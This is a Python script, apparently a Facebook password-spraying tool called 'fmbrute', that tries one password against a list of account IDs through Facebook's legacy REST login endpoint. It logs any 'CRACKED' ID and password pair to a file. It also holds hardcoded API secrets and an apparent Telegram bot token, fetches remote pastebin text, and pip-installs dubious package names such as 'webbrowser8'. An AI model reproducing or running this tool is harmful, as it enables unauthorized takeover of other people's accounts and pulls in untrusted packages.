import os
os.system('pip install sys')
os.system('pip install requests')
os.system('pip install hashlib')
os.system('pip install webbrowser8')
os.system('clear')
import sys
import hashlib
import requests
import webbrowser
if sys.platform == "linux2":
	os.system("clear")
elif sys.platform == "win32":
	os.system("cls")
else:
	os.system("clear")
API_SECRET = "62f8ce9f74b12f84c123cc23437a4a32"
jd = 'https://pastebin.com/raw/kXPNhAq2'
d = '\033[1;31m'
f = '\033[1;33m'
p = '\033[1;31m'
n = '\033[1;35m'
bh= '1468816115:AAEIp-9MZhDzrAiUtU-52IUyDQB-jnqFfN0'
__banner__ = """\033[1;36m
█▀▀█   █░░█   █░█   █▀▀   █░█ █░░
█▄▄▀   █░░█   █▀▄   ▀▀█   █▀▄ █░░
▀░▀▀   ░▀▀▀   ▀░▀   ▀▀▀   ▀░▀ ▀▀▀
"""
r = requests.get(jd).text
print(__banner__)
print(p+r)
print('════════════════════════════════════════════════════')
print(d+"["+f+"1"+d+"]"+n+" Running a tool ; ")
print(d+"["+f+"2"+d+"]"+n+" Developer channel ; ")


ali1 = input(d+"["+f+"+"+d+"]-")

if ali1 == '1' :
        import os
        import sys
        import hashlib
        import requests
        if os.path.isdir("result.txt") == True:
                os.rmdir("result.txt")
        try:
                idlist = input(d+"["+f+"$"+d+"]"+f+ " set PATH to idlist ; ")
                      
                if os.path.exists(idlist) != False:
                        while True:
                                password = input(d+"["+f+"$"+d+"]"+f+ " Enter Password ; ")
                                id = input(d+"["+f+"+"+d+"]"+f+" id telegram ; ")
                                if password == "" or password == (" "*len(password)):
                                        print("[!] fmbrute: error: Don't leave the password blank")
                                elif len(password) < 5:
                                        print("[!] fmbrute: error: Password is too short")
                                else:
                                        break
                        print("==============================================")
                        count = 0
                        length = len(open(idlist,'r').read().split("\n"))
                        result = open("result.txt", "a")
                        for id in open(idlist,'r').read().split("\n"):
                                print(d+"["+f+"!"+d+"]"+f+ " Trying id  ; {} ({}-{})".format(id,count+1,length))
                                sig = "api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail="+id+"format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword="+password+"return_ssl_resources=0v=1.0"+API_SECRET
                                xx = hashlib.md5(sig.encode(encoding="UTF-8",errors="strict")).hexdigest()
                                data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON","generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":password,"return_ssl_resources":"0","v":"1.0","sig":xx}
                                r = requests.get("https://api.facebook.com/restserver.php",params=data)
                              #  Another error handle response:
                          #      if r.json()["error_msg"] != None or r.json()["error"]["message"] == "An unknown error occurred":
                                if "error" in r.text:
                                        pass
                                else:
                                        print("\a======== CRACKED =========")
                                        print("\a[+] FB USER : "+id)
                                        print("\a[+] FB PASS : "+password)
                                        
                                        print("\a==========================")
                                        result.write("{}|{}".format(id, password))
                                count+=1
                        print("[~] Done.")
                        result.close()
                else:
                        print("fmbrute: error: No such file or directory")
        except KeyboardInterrupt:
                print("fmbrute: error: Keyboard interrupt")
        except:
                print("fmbrute: error: Device is not connected to the internet")
if ali1 == '2' :
    webbrowser.open('https://t.me/DIBIBl')
